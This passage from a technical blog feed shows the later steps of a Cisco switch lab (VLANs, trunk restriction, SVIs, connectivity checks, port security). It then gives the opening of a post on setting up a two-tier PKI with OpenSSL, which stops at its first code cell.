SW1(config-if-range)<span style="color:#999;font-style:italic">#no shutdown</span>
</code></pre></div><p>Now do the same with <code>SW3</code> (ports are of course different):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW3(config)<span style="color:#999;font-style:italic">#int f0/3</span>
SW3(config-if)<span style="color:#999;font-style:italic">#switchport mode access </span>
SW3(config-if)<span style="color:#999;font-style:italic">#switchport access vlan 10</span>
SW3(config-if)<span style="color:#999;font-style:italic">#no shutdown </span>
</code></pre></div><p>Add the VLAN config to <code>SW2</code> as well:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW2(config)<span style="color:#999;font-style:italic">#vlan 10</span>
SW2(config-vlan)<span style="color:#999;font-style:italic">#name Students</span>
SW2(config-vlan)<span style="color:#999;font-style:italic">#exit</span>
</code></pre></div><h3 id="add-vlan-teachers">Add VLAN Teachers</h3>
<p>The configuration is pretty straight-forward:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW2(config)<span style="color:#999;font-style:italic">#vlan 20</span>
SW2(config-vlan)<span style="color:#999;font-style:italic">#name Teachers</span>
SW2(config-vlan)<span style="color:#999;font-style:italic">#exit</span>
SW2(config)<span style="color:#999;font-style:italic">#int range f0/3 - 4</span>
SW2(config-if-range)<span style="color:#999;font-style:italic">#switchport mode access </span>
SW2(config-if-range)<span style="color:#999;font-style:italic">#switchport access vlan 10</span>
SW2(config-if-range)<span style="color:#999;font-style:italic">#no shutdown </span>
</code></pre></div><p>Now on <code>SW3</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW3(config-vlan)<span style="color:#999;font-style:italic">#name Teachers</span>
SW3(config-vlan)<span style="color:#999;font-style:italic">#exit</span>
SW3(config)<span style="color:#999;font-style:italic">#int f0/2</span>
SW3(config-if)<span style="color:#999;font-style:italic">#switchport mode access </span>
SW3(config-if)<span style="color:#999;font-style:italic">#switchport access vlan 20</span>
SW3(config-if)<span style="color:#999;font-style:italic">#no shutdown </span>
</code></pre></div><p>Don&rsquo;t forget to add the VLAN config to <code>SW1</code> as well:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1(config)<span style="color:#999;font-style:italic">#vlan 20</span>
SW1(config-vlan)<span style="color:#999;font-style:italic">#name Teachers</span>
SW1(config-vlan)<span style="color:#999;font-style:italic">#exit</span>
</code></pre></div><h3 id="restrict-vlans-on-trunk-ports">Restrict VLANs on trunk ports</h3>
<p>If you have a look at the configured trunk ports, you&rsquo;ll get sth like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1#sh int trunk
Port        Mode         Encapsulation  Status        Native vlan
Fa0/1       on           802.1q         trunking      <span style="color:#3677a9">1</span>

Port        Vlans allowed on trunk
Fa0/1       1-1005

Port        Vlans allowed and active in management domain
Fa0/1       1,10,20

Port        Vlans in spanning tree forwarding state and not pruned
Fa0/1       1,10,20
</code></pre></div><p>You&rsquo;ll notice that the <strong>allowed VLANs</strong> on the trunk ports range from <code>1-1005</code>. Actually (and due to security reasons) we want to restrict the VLANs which should be forwarded by the switches:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1(config)<span style="color:#999;font-style:italic">#int f0/1</span>
SW1(config-if)<span style="color:#999;font-style:italic">#switchport trunk allowed vlan 10,20</span>
</code></pre></div><p>We only want to allow frames with a VLAN tag id = {10, 20}. <strong>Every</strong> trunk port must be configured that way. Finally you can verify that by:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW2#sh int trunk
Port        Mode         Encapsulation  Status        Native vlan
Fa0/1       on           802.1q         trunking      <span style="color:#3677a9">1</span>
Fa0/2       on           802.1q         trunking      <span style="color:#3677a9">1</span>

Port        Vlans allowed on trunk
Fa0/1       10,20
Fa0/2       10,20

Port        Vlans allowed and active in management domain
Fa0/1       10,20
Fa0/2       10,20

Port        Vlans in spanning tree forwarding state and not pruned
Fa0/1       10,20
Fa0/2       10,20
</code></pre></div><h3 id="configure-switch-virtual-interfaces">Configure Switch Virtual Interfaces</h3>
<p>Traditionally switches operate on <em>Layer 2</em>. By using <strong>SVI</strong>s (Switch Virtual Interface) the switches uses a virtual <em>Layer 3</em> interface to route traffic to other <em>Layer 3</em> interface without any physical router. VLANs divide networks into smaller segments which keep traffic inside the VLAN. And because each VLAN has its own domain, a mechanism is needed to pass data to other VLANs.</p>
<p>In our case we&rsquo;ll have to add each switch to some VLAN and assign some SVI a valid routable IP address.</p>
<table cellpadding="0" cellspacing="0" width="100%" border="0">
  <tr>
    <th>Switch </th>
    <th>IP address</th>
    <th>VLAN</th>
  </tr>
  <tr>
    <td>SW1</td>
    <td>30.30.30.1</td>
    <td>Management</td>
  </tr>
  <tr>
    <td>SW2</td>
    <td>30.30.30.2</td>
    <td>Management</td>
  </tr>
  <tr>
    <td>SW3</td>
    <td>30.30.30.3</td>
    <td>Management</td>
  </tr>
</table>
<ul>
<li>Configure <code>SW1</code>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1(config)<span style="color:#999;font-style:italic">#vlan 30</span>
SW1(config-vlan)<span style="color:#999;font-style:italic">#name Management</span>
SW1(config-vlan)<span style="color:#999;font-style:italic">#exit</span>
SW1(config)<span style="color:#999;font-style:italic">#int vlan 30</span>
SW1(config-if)<span style="color:#999;font-style:italic">#</span>
%LINK-5-CHANGED: Interface Vlan30, changed state to up

SW1(config-if)<span style="color:#999;font-style:italic">#ip address 30.30.30.1 255.255.255.0</span>
SW1#sh ip int brief
...
Vlan30                 30.30.30.1      YES manual up                    down
</code></pre></div><ul>
<li>Configure <code>SW2</code>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW2(config)<span style="color:#999;font-style:italic">#vlan 30</span>
SW2(config-vlan)<span style="color:#999;font-style:italic">#name Management</span>
SW2(config-vlan)<span style="color:#999;font-style:italic">#exit</span>
SW2(config)<span style="color:#999;font-style:italic">#int vlan 30</span>
SW2(config-if)<span style="color:#999;font-style:italic">#</span>
%LINK-5-CHANGED: Interface Vlan30, changed state to up

SW2(config-if)<span style="color:#999;font-style:italic">#ip add</span>
SW2(config-if)<span style="color:#999;font-style:italic">#ip address 30.30.30.2 255.255.255.0</span>
SW2#sh ip int brief
...
Vlan30                 30.30.30.2      YES manual up                    down
</code></pre></div><ul>
<li>Configure <code>Sw3</code>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW3(config)<span style="color:#999;font-style:italic">#vlan 30</span>
SW3(config-vlan)<span style="color:#999;font-style:italic">#name Management</span>
SW3(config-vlan)<span style="color:#999;font-style:italic">#exit</span>
SW3(config)<span style="color:#999;font-style:italic">#int vlan 30</span>
SW3(config-if)<span style="color:#999;font-style:italic">#</span>
%LINK-5-CHANGED: Interface Vlan30, changed state to up

SW3(config-if)<span style="color:#999;font-style:italic">#ip address 30.30.30.3 255.255.255.0</span>
SW3#sh ip int brief
...
Vlan30                 30.30.30.3      YES manual up                    down
</code></pre></div><p>As you can see the interfaces are all in <strong>up/down</strong> state which is generally a <strong>Layer 2</strong> problem. If you remember correctly we have configured the <em>trunk</em> ports previously. We also allowed only <em>specific</em> VLANs to pass through these trunks. In this case we&rsquo;ll have to allow VLAN <strong>Management</strong> as well. Just an example for <code>SW2</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW2(config)<span style="color:#999;font-style:italic">#int range f0/1 - 2</span>
SW2(config-if-range)<span style="color:#999;font-style:italic">#switchport trunk allowed vlan 10,20,30</span>
</code></pre></div><p>Now the port should be resetted:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">
SW2(config)<span style="color:#999;font-style:italic">#int vlan 30</span>
SW2(config-if)<span style="color:#999;font-style:italic">#no shutdown </span>
SW2(config-if)<span style="color:#999;font-style:italic">#</span>
%LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan30, changed state to up

SW2(config-if)<span style="color:#999;font-style:italic">#^Z</span>
</code></pre></div><p>And then check again the port state:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW2#sh ip int brief
...
Vlan30                 30.30.30.2      YES manual up                    up
</code></pre></div><p>The configuration steps for <code>SW1</code> and <code>SW3</code> are here intentionally ommitted.</p>
<h2 id="connectivity">Connectivity</h2>
<h3 id="ping-between-pcs">Ping between PCs</h3>
<p>Now let&rsquo;s check the connectivity between the posts:</p>
<ul>
<li><code>PC1</code> -&gt; <code>PC2</code>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">PC&gt;ping 10.10.10.102

Pinging 10.10.10.102 with <span style="color:#3677a9">32</span> bytes of data:

Reply from 10.10.10.102: <span style="color:#40ffff">bytes</span>=<span style="color:#3677a9">32</span> <span style="color:#40ffff">time</span>=1ms <span style="color:#40ffff">TTL</span>=<span style="color:#3677a9">128</span>
Reply from 10.10.10.102: <span style="color:#40ffff">bytes</span>=<span style="color:#3677a9">32</span> <span style="color:#40ffff">time</span>=0ms <span style="color:#40ffff">TTL</span>=<span style="color:#3677a9">128</span>
Reply from 10.10.10.102: <span style="color:#40ffff">bytes</span>=<span style="color:#3677a9">32</span> <span style="color:#40ffff">time</span>=0ms <span style="color:#40ffff">TTL</span>=<span style="color:#3677a9">128</span>
Reply from 10.10.10.102: <span style="color:#40ffff">bytes</span>=<span style="color:#3677a9">32</span> <span style="color:#40ffff">time</span>=0ms <span style="color:#40ffff">TTL</span>=<span style="color:#3677a9">128</span>

Ping statistics <span style="color:#6ab825;font-weight:bold">for</span> 10.10.10.102:
    Packets: <span style="color:#40ffff">Sent</span> = 4, <span style="color:#40ffff">Received</span> = 4, <span style="color:#40ffff">Lost</span> = <span style="color:#3677a9">0</span> (0% loss),
Approximate round trip <span style="color:#24909d">times</span> in milli-seconds:
    <span style="color:#40ffff">Minimum</span> = 0ms, <span style="color:#40ffff">Maximum</span> = 1ms, <span style="color:#40ffff">Average</span> = 0ms
</code></pre></div><ul>
<li><code>PC1</code> -&gt; <code>PC5</code>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">PC&gt;ping 10.10.10.105

Pinging 10.10.10.105 with <span style="color:#3677a9">32</span> bytes of data:

Reply from 10.10.10.105: <span style="color:#40ffff">bytes</span>=<span style="color:#3677a9">32</span> <span style="color:#40ffff">time</span>=1ms <span style="color:#40ffff">TTL</span>=<span style="color:#3677a9">128</span>
Reply from 10.10.10.105: <span style="color:#40ffff">bytes</span>=<span style="color:#3677a9">32</span> <span style="color:#40ffff">time</span>=0ms <span style="color:#40ffff">TTL</span>=<span style="color:#3677a9">128</span>
Reply from 10.10.10.105: <span style="color:#40ffff">bytes</span>=<span style="color:#3677a9">32</span> <span style="color:#40ffff">time</span>=0ms <span style="color:#40ffff">TTL</span>=<span style="color:#3677a9">128</span>
Reply from 10.10.10.105: <span style="color:#40ffff">bytes</span>=<span style="color:#3677a9">32</span> <span style="color:#40ffff">time</span>=0ms <span style="color:#40ffff">TTL</span>=<span style="color:#3677a9">128</span>

Ping statistics <span style="color:#6ab825;font-weight:bold">for</span> 10.10.10.105:
    Packets: <span style="color:#40ffff">Sent</span> = 4, <span style="color:#40ffff">Received</span> = 4, <span style="color:#40ffff">Lost</span> = <span style="color:#3677a9">0</span> (0% loss),
Approximate round trip <span style="color:#24909d">times</span> in milli-seconds:
    <span style="color:#40ffff">Minimum</span> = 0ms, <span style="color:#40ffff">Maximum</span> = 1ms, <span style="color:#40ffff">Average</span> = 0ms
</code></pre></div><ul>
<li><code>PC4</code> -&gt; <code>PC6</code>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">PC&gt;ping 20.20.20.106

Pinging 20.20.20.106 with <span style="color:#3677a9">32</span> bytes of data:

Reply from 20.20.20.106: <span style="color:#40ffff">bytes</span>=<span style="color:#3677a9">32</span> <span style="color:#40ffff">time</span>=0ms <span style="color:#40ffff">TTL</span>=<span style="color:#3677a9">128</span>
Reply from 20.20.20.106: <span style="color:#40ffff">bytes</span>=<span style="color:#3677a9">32</span> <span style="color:#40ffff">time</span>=0ms <span style="color:#40ffff">TTL</span>=<span style="color:#3677a9">128</span>
Reply from 20.20.20.106: <span style="color:#40ffff">bytes</span>=<span style="color:#3677a9">32</span> <span style="color:#40ffff">time</span>=0ms <span style="color:#40ffff">TTL</span>=<span style="color:#3677a9">128</span>
Reply from 20.20.20.106: <span style="color:#40ffff">bytes</span>=<span style="color:#3677a9">32</span> <span style="color:#40ffff">time</span>=0ms <span style="color:#40ffff">TTL</span>=<span style="color:#3677a9">128</span>

Ping statistics <span style="color:#6ab825;font-weight:bold">for</span> 20.20.20.106:
    Packets: <span style="color:#40ffff">Sent</span> = 4, <span style="color:#40ffff">Received</span> = 4, <span style="color:#40ffff">Lost</span> = <span style="color:#3677a9">0</span> (0% loss),
Approximate round trip <span style="color:#24909d">times</span> in milli-seconds:
    <span style="color:#40ffff">Minimum</span> = 0ms, <span style="color:#40ffff">Maximum</span> = 0ms, <span style="color:#40ffff">Average</span> = 0ms
</code></pre></div><h3 id="ping-between-switches">Ping between Switches</h3>
<ul>
<li><code>SW3</code> -&gt; <code>SW1</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW3#ping 30.30.30.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 30.30.30.1, timeout is <span style="color:#3677a9">2</span> seconds:
..!!!
Success rate is <span style="color:#3677a9">60</span> percent (3/5), round-trip min/avg/max = 0/0/0 ms
</code></pre></div><p>The first 2 ICMP Echo Requests were not successful because <code>SW3</code> and <code>SW2</code> didn&rsquo;t have yet the MAC address of <code>SW1</code>. The 2nd ping command will therefore have 100% connectivity rate since the MAC address table has been updated:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW3#ping 30.30.30.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 30.30.30.1, timeout is <span style="color:#3677a9">2</span> seconds:
!!!!!
Success rate is <span style="color:#3677a9">100</span> percent (5/5), round-trip min/avg/max = 0/1/6 ms
</code></pre></div><h3 id="ssh">SSH</h3>
<ul>
<li><code>SW1</code> -&gt; <code>SW2</code>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1#ssh -l admin -v <span style="color:#3677a9">2</span> 30.30.30.2
Open
Password: 



SW2&gt;enable
Password: 
SW2#exit

[Connection to 30.30.30.2 closed by foreign host]
SW1#
</code></pre></div><h3 id="mac-address-tables">MAC address tables</h3>
<p>Now that we have pinged the hosts, the switches should now have all MAC addresses in their tables:</p>
<ul>
<li><code>SW2</code>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW2#show mac address-table 
          Mac Address Table
-------------------------------------------

Vlan    Mac Address       Type        Ports
----    -----------       --------    -----

   <span style="color:#3677a9">1</span>    0030.a341.e901    DYNAMIC     Fa0/2
   <span style="color:#3677a9">1</span>    0090.211e.2e01    DYNAMIC     Fa0/1
  <span style="color:#3677a9">10</span>    0001.437b.a40c    DYNAMIC     Fa0/2
  <span style="color:#3677a9">10</span>    0030.a341.e901    DYNAMIC     Fa0/2
  <span style="color:#3677a9">10</span>    0030.f28c.c65a    DYNAMIC     Fa0/1
  <span style="color:#3677a9">20</span>    0030.a319.da0b    DYNAMIC     Fa0/4
  <span style="color:#3677a9">20</span>    0030.a341.e901    DYNAMIC     Fa0/2
  <span style="color:#3677a9">20</span>    0060.7079.8692    DYNAMIC     Fa0/2
</code></pre></div><h2 id="security">Security</h2>
<h3 id="port-security">Port security</h3>
<p>Now suppose <code>SW1</code> should implement <strong>port security</strong> and therefore allow only <strong>pre-defined</strong> devices to connect to the switch. This will prevent devices which MAC addresses is not included in the whitelist from sending frames through <code>SW1</code>. The next commands will configure port security for ports <strong>F0/2</strong> (PC1) and <strong>F0/3</strong> (PC2):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1#conf t
Enter configuration commands, one per line.  End with CNTL/Z.
SW1(config)<span style="color:#999;font-style:italic">#int f0/2</span>
SW1(config-if)<span style="color:#999;font-style:italic">#switchport port-security </span>
SW1(config-if)<span style="color:#999;font-style:italic">#switchport port-security mac-address 0030.f28c.c65a</span>
SW1(config-if)<span style="color:#999;font-style:italic">#exit</span>
SW1(config)<span style="color:#999;font-style:italic">#int f0/3</span>
SW1(config-if)<span style="color:#999;font-style:italic">#switchport port-security </span>
SW1(config-if)<span style="color:#999;font-style:italic">#switchport port-security mac-address 0060.2fd2.a80a</span>
SW1(config-if)<span style="color:#999;font-style:italic">#exit</span>
</code></pre></div><p>Check the configuration:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1#sh port-security int f0/2
Port Security              : Enabled
Port Status                : Secure-up
Violation Mode             : Shutdown
Aging Time                 : <span style="color:#3677a9">0</span> mins
Aging Type                 : Absolute
SecureStatic Address Aging : Disabled
Maximum MAC Addresses      : <span style="color:#3677a9">1</span>
Total MAC Addresses        : <span style="color:#3677a9">1</span>
Configured MAC Addresses   : <span style="color:#3677a9">1</span>
Sticky MAC Addresses       : <span style="color:#3677a9">0</span>
Last Source Address:Vlan   : 0030.F28C.C65A:10
Security Violation Count   : <span style="color:#3677a9">0</span>

SW1#sh port-security int f0/3
Port Security              : Enabled
Port Status                : Secure-up
Violation Mode             : Shutdown
Aging Time                 : <span style="color:#3677a9">0</span> mins
Aging Type                 : Absolute
SecureStatic Address Aging : Disabled
Maximum MAC Addresses      : <span style="color:#3677a9">1</span>
Total MAC Addresses        : <span style="color:#3677a9">1</span>
Configured MAC Addresses   : <span style="color:#3677a9">0</span>
Sticky MAC Addresses       : <span style="color:#3677a9">0</span>
Last Source Address:Vlan   : 0060.2FD2.A80A:10
Security Violation Count   : <span style="color:#3677a9">0</span>
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Manage PKI using OpenSSL</title>
      <link>https://blog.dornea.nu/2015/10/02/manage-pki-using-openssl/</link>
      <pubDate>Fri, 02 Oct 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/10/02/manage-pki-using-openssl/</guid>
      <content:encoded><![CDATA[


<blockquote class="notice info">
  For better display results you can also have a look at the <a href="https://github.com/dorneanu/blog/blob/master/content/jupyter/2015-10-02-manage-a-pki-using-openssl.v3.ipynb">Manage a PKI using OpenSSL</a>.
</blockquote>

<p>In the previous X.509 related <a href="http://blog.dornea.nu/2015/05/24/validating-and-pinning-x509-certificates/">post</a> I&rsquo;ve had a look at the internals of a X.509 certficate. This time I want to setup my own <a href="https://en.wikipedia.org/wiki/Public_key_infrastructure">PKI</a> using some <em>open source</em> software. This post is a preparation for setting up a VPN using <em>OpenVPN</em>.</p>
<p>Before implementing the PKI let&rsquo;s have a look what a PKI should definitely include (make sure you have a look at the <a href="https://en.wikipedia.org/wiki/Public_key_infrastructure">Wikipedia entry</a>):</p>
<ul>
<li>certificate authority (<strong>CA</strong>)
<ul>
<li>has a public and a private key</li>
<li>used to digitally sign <em>certificates</em></li>
</ul>
</li>
<li>registration authority (<strong>RA</strong>)
<ul>
<li>verify identify of users requesting information from the CA</li>
</ul>
</li>
<li>certificate management system
<ul>
<li>probably the most important component</li>
</ul>
</li>
</ul>
<h2 id="revision">Revision</h2>
<table class="equalDevide" cellpadding="0" cellspacing="0" width="100%" border="0">
  <tr>
    <th><b>Date</b></th>
    <th><b>Description</b></th>
  </tr>
  <tr>
    <td>2015-10-02</td>
    <td>First release</td>
  </tr>
  <tr>
    <td>2015-11-17</td>
    <td>Added creation of VPN-CA and related certificates.</td>
  </tr>
</table>
<h2 id="ca-types">CA types</h2>
<p>There are several <a href="https://pki-tutorial.readthedocs.org/en/latest/#ca-types">types</a> of <strong>CA</strong>s:</p>
<ul>
<li>root CA
<ul>
<li>the <em>root</em> of the PKI hierarchy</li>
<li>issues <em>CA certificates</em></li>
</ul>
</li>
<li>intermediate CA
<ul>
<li>the CA right below the <em>root</em> CA</li>
<li>issues <em>CA certificates</em></li>
</ul>
</li>
<li>signing CA
<ul>
<li>CA at the bottom of the PKI hierarchy</li>
<li>issues only <em>user certificates</em></li>
</ul>
</li>
</ul>
<h2 id="certificates-types">Certificates types</h2>
<p>There are several <a href="https://pki-tutorial.readthedocs.org/en/latest/#certificate-types">types of certificates</a> used in real-world:</p>
<ul>
<li>root certificate
<ul>
<li><em>self-signed</em> certificate at the root of the PKI hierarchy</li>
<li>has to be kept <em>secret</em></li>
</ul>
</li>
<li>CA certificate
<ul>
<li>used to sign other certificates and CRLs</li>
</ul>
</li>
<li>user certificate
<ul>
<li>end-user certificate issues for one purpose: code signing, mail protection etc.</li>
<li>user certificates can <strong>not</strong> sign other certificates</li>
</ul>
</li>
</ul>
<h2 id="pki-hierarchy">PKI hierarchy</h2>
<p>In most modern companies you&rsquo;ll find a <strong>3-tier</strong> PKI hierarchy.</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">blockdiag {â†”

// Define class (list of attributes)
class emphasis [color = pink, style = dashed];
class blackline [color = black, style = dotted];
class blue [color = lightblue];

Root_CA [class = &#34;emphasis&#34;, label = &#34;Root CA&#34;];
Intermediate_CA1 [class = &#34;blue&#34;, label = &#34;Intermediate CA&#34;];
Intermediate_CA2 [class = &#34;blue&#34;, label = &#34;Intermediate CA&#34;];
Intermediate_CA3 [class = &#34;blue&#34;, label = &#34; ... &#34;];
Signing_CA1 [label = &#34;Signing CA&#34;];
Signing_CA1_0 [label = &#34; ... &#34;];

Signing_CA2 [label = &#34;Signing CA&#34;];
Signing_CA2_0 [label = &#34; ... &#34;];

Signing_CA3 [label = &#34;Signing CA&#34;];
Signing_CA3_0 [label = &#34; ... &#34;];

Root_CA -&gt; Intermediate_CA1;
Root_CA -&gt; Intermediate_CA2 [class = &#34;blackline&#34;];
Root_CA -&gt; Intermediate_CA3 [class = &#34;blackline&#34;];
Intermediate_CA1 -&gt; Signing_CA1;
Intermediate_CA1 -&gt; Signing_CA1_0 [class = &#34;blackline&#34;];

Intermediate_CA2 -&gt; Signing_CA2 [class = &#34;blackline&#34;];
Intermediate_CA2 -&gt; Signing_CA2_0 [class = &#34;blackline&#34;];

Intermediate_CA3 -&gt; Signing_CA3 [class = &#34;blackline&#34;];
Intermediate_CA3 -&gt; Signing_CA3_0 [class = &#34;blackline&#34;];
}
</code></pre></div>
</details>

<p><img src="/posts/img/2015/manage-a-pki-using-openssl/output_1_0.png" alt="png"></p>
<p>For my purposes I&rsquo;ll be using only a <strong>2-tier</strong> hierarchy as shown below:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">blockdiag {
// Define orientation
orientation = portrait;

// Define class (list of attributes)
class emphasis [color = pink, style = dashed];
class blackline [color = black, style = dotted];
class blue [color = lightblue];

Root_CA [class = &#34;emphasis&#34;, label = &#34;Root CA&#34;];
Signing_CA1 [label = &#34;Signing CA&#34;];
Signing_CA2 [label = &#34;Signing CA&#34;];
Signing_CA3 [label = &#34;Signing CA&#34;];

Root_CA -&gt; Signing_CA1;
Root_CA -&gt; Signing_CA2;
Root_CA -&gt; Signing_CA3;
}
</code></pre></div>
</details>

<p><img src="/posts/img/2015/manage-a-pki-using-openssl/output_3_0.png" alt="png"></p>
<p>The level of security is increased because you separate the root CA from the issuing CAs. The root CA is mostly offline so the private key to sign the certificates should be thus protected from compromise. If one of the <em>issuing CAs</em> is being compromised, you can <em>revoke</em> the certificate issued for that specific CA and create another one using the <em>root CA</em>. You can also have multiple issuing CAs distributed geographically and with different security levels. This increases <em>flexibility</em> and <em>scalability</em>.</p>
<blockquote>
<p>Also checkout this <a href="http://blogs.technet.com/b/askds/archive/2009/09/01/designing-and-implementing-a-pki-part-i-design-and-planning.aspx">awesome article</a> for further details.</p>
</blockquote>
<h3 id="dorneanu-pki-hierarchy">dornea.nu PKI hierarchy</h3>
<p>And now let&rsquo;s make this whole hierarchy more personalized:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">blockdiag {
// Define orientation
orientation = portrait;

// Define class (list of attributes)
class emphasis [color = pink, style = dashed];
class blackline [color = black, style = dotted];
class blue [color = lightblue];
class inactive [color = lightgrey];

Root_CA [class = &#34;emphasis&#34;, label = &#34;dornea.nu root CA&#34;];
Signing_CA2 [label = &#34;dev.dornea.nu CA&#34;];
Signing_CA3 [label = &#34;vpn.dornea.nu CA&#34;];
TLS_Server_CA [label = &#34;TLS Server Cert&#34;, shape = flowchart.terminator, style = dotted];
TLS_Client_CA [label = &#34;TLS Client Cert&#34;, shape = flowchart.terminator, style = dotted];
VPN_Server_CA [class = inactive, label = &#34;VPN Server Cert&#34;, shape = flowchart.terminator, style = dotted];
VPN_Client_CA [class = inactive, label = &#34;VPN Client Cert&#34;, shape = flowchart.terminator, style = dotted];

Root_CA -&gt; Signing_CA2 [label = &#34;issues&#34;];
Root_CA -&gt; Signing_CA3;

Signing_CA2 -&gt; TLS_Server_CA [label = &#34;issues&#34;];
Signing_CA2 -&gt; TLS_Client_CA;

Signing_CA3 -&gt; VPN_Server_CA [label = &#34;issues&#34;];
Signing_CA3 -&gt; VPN_Client_CA;
}
</code></pre></div>
</details>

<p><img src="/posts/img/2015/manage-a-pki-using-openssl/output_5_0.png" alt="png"></p>
<p>We&rsquo;ll have a <strong>root CA</strong> bound to the domain <code>dornea.nu</code> followed by 2 intermediate CAs: <strong>dev.dornea.nu CA</strong> and <strong>vpn.dornea.nu CA</strong>. The CAs will be used to issue certificates to <em>users</em> and <em>networks</em>.</p>
<p>The <strong>TLS Server CA</strong> will be used by a web server like Apache or Nginx to server content over a SSL/TLS connection. The server will only accept connection from clients with a valid <strong>TLS Client CA</strong> which has been signed (and generated) from <strong>dev.dornea.nu CA</strong>.</p>
<p>The <strong>vpn.dornea.nu CA</strong> will then issue certificates for a <strong>VPN Server CA</strong> and a <strong>VPN Client CA</strong>.</p>
<blockquote>
<p>In this post the creation of the <em>VPN Server CA</em> and <em>VPN Client CA</em> will be ommitted. I&rsquo;ll cover this in a related post.</p>
</blockquote>
<h2 id="openssl">OpenSSL</h2>
<p><a href="https://www.openssl.org">OpenSSL</a> is probably the most known cryptography software and SSL/TLS toolkit. Let&rsquo;s have look how things are done using OpenSSL. First of all I&rsquo;ll setup a directory structure to represent each of the PKI component in a clean way.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%bash<span style="color:#a61717;background-color:#e3d2d2">â†”</span>

